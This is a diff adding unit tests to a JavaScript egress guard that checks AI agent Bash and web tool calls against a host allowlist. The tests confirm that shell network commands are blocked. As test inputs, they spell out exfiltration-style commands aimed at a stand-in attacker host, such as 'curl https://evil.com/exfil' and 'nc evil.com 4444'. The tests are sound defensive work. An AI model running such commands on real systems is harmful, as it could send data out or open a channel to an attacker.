@@ -5,6 +5,7 @@ import {
   hostFromUrl,
   hostMatches,
   checkCall,
+  extractHostsFromCommand,
 } from "../src/egress-guard.js";
 
 test("extractUrl reads url / uri / endpoint", () => {
@@ -65,4 +66,57 @@ test("checkCall blocks an http call with an unresolvable host", () => {
   const r = checkCall({ tool: "WebFetch", args: { url: "garbage ::: not a url" } }, egress);
   assert.ok(r.blocked);
   assert.equal(r.host, "");
+});
+
+// ---- shell egress: curl/wget/nc must not bypass the allowlist --------------
+
+test("extractHostsFromCommand finds explicit URLs and bare network-tool hosts", () => {
+  assert.deepEqual(extractHostsFromCommand("curl https://evil.com/exfil"), [
+    "evil.com",
+  ]);
+  assert.deepEqual(extractHostsFromCommand("wget http://Bad.Example.COM/x"), [
+    "bad.example.com",
+  ]);
+  assert.deepEqual(extractHostsFromCommand("nc evil.com 4444"), ["evil.com"]);
+  assert.deepEqual(extractHostsFromCommand("scp file user@host.example.org:/tmp"), [
+    "host.example.org",
+  ]);
+  // A local command with no destination yields nothing.
+  assert.deepEqual(extractHostsFromCommand("ls -la /tmp"), []);
+});
+
+test("checkCall: shell curl to a non-allowlisted host is denied (allowlist bypass fixed)", () => {
+  const egress = { allow: ["api.github.com"] };
+  const r = checkCall(
+    { tool: "Bash", args: { command: "curl https://evil.com/exfil" } },
+    egress
+  );
+  assert.ok(r.blocked, "curl to evil.com must be blocked under an allowlist");
+  assert.equal(r.action, "deny");
+  assert.equal(r.host, "evil.com");
+});
+
+test("checkCall: shell curl to an allowlisted host is allowed", () => {
+  const egress = { allow: ["api.github.com"] };
+  const r = checkCall(
+    { tool: "Bash", args: { command: "curl https://api.github.com/repos" } },
+    egress
+  );
+  assert.equal(r.blocked, false);
+});
+
+test("checkCall: a local shell command (no network host) is not blocked", () => {
+  const egress = { allow: ["api.github.com"] };
+  const r = checkCall({ tool: "Bash", args: { command: "ls -la /tmp" } }, egress);
+  assert.equal(r.blocked, false);
+});
+
+test("checkCall: shell egress honors action: ask", () => {
+  const egress = { allow: ["api.github.com"], action: "ask" };
+  const r = checkCall(
+    { tool: "Bash", args: { command: "wget http://other.example.com/x" } },
+    egress
+  );
+  assert.ok(r.blocked);
+  assert.equal(r.action, "ask");
 });
